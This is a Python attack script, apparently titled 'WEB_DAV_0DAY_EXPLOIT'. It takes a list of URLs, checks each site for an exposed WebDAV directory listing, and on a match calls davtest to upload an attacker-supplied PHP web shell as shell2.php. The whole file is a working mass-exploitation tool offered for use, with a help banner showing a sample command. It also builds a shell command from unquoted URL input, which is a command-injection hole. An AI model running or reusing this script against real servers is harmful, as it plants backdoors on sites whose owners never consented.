from requests.api import options


try : 
    import requests
    from bs4 import BeautifulSoup
    from random import * 
    import re , time , os
    from colorama import Fore as F , init
    import socket
    from optparse import OptionParser
    from multiprocessing.dummy import Pool
    from requests.exceptions import RequestException
    from console.utils import set_title
    init(autoreset=True)
except : 
    print('plz install all modules and come back ! ')    
    exit(0)
# this is a help menu with using model called : optparser
#############################################################
def zero_day():
    global upload
    parse = OptionParser(f'''
{F.GREEN} 
   ___      _                 __          __  _           _____     __      __
  / _ \    | |                \ \        / / | |         |  __ \   /\ \    / /
 | | | | __| | __ _ _   _ _____\ \  /\  / /__| |__ ______| |  | | /  \ \  / / 
 | | | |/ _` |/ _` | | | |______\ \/  \/ / _ \ '_ \______| |  | |/ /\ \ \/ /  
 | |_| | (_| | (_| | |_| |       \  /\  /  __/ |_) |     | |__| / ____ \  /   
  \___/ \__,_|\__,_|\__, |        \/  \/ \___|_.__/      |_____/_/    \_\/    
                     __/ |                                                    
                    |___/   
                    {F.RED}  
______________________________________________________________________________                    
            {F.WHITE} Coded By Ilyase MRX  | @devil_shell     
    {F.BLUE}
                              HELP COMMAND : 
    use -p or --path to put the path of urls list / ex : -p /root/Desktop/list.txt
    use -t or --threads to give how mush it
    use -s or --shellpath the commadn help us to try to upload the file in vuln website !!
    
                         Ex of full command : 
    python3 dav_exploit.py -t 80 -p /root/Desktop/list.txt --shellpath /root/Desktop/shellphp              
    
                               
''')

    #parse.add_option("-u","--urls",dest="urls")
    parse.add_option('-p','--path',dest='pathofurls')
    parse.add_option('-t','--threads',type='string',dest='pool')
    parse.add_option('-s' ,'--shellpath',dest='shellwork')
    (options ,args) = parse.parse_args()
    if options.pathofurls == None or options.shellwork == None or options.pool == None:
        print(parse.usage)
    else : 
        upload = options.shellwork
        print(f' {F.YELLOW} Welcome User ! :)) ')
        urls__ = [x.strip() for x in open(options.pathofurls,'r').readlines()]
        p = Pool(int(options.pool))
        p.map(start_exploit , urls__)
########################################
#func.start_exploit()
def start_exploit(urls):
    found = 0
    try : 
        source = requests.get(urls+'/dav/').text
        if 'Index of /dav' in source : 
            found +=1
            print(F.GREEN + ' Vuln as Web_dav exploit -> {} '.format(urls))
            print(F.GREEN + 'Tring Upload shells !! {}' . format(urls))
            time.sleep(2)
            print(os.system(f'davtest -url {urls}/dav/ -uploadfile {upload} -uploadloc shell2.php'))
        else : 
            print(F.RED + ' Not Vuln : -> {} '.format(urls))
        set_title('WEB_DAV_0DAY_EXPLOIT | SITE VULN : {}'.format(found))    
    except : 
        pass
 
zero_day()




            
        
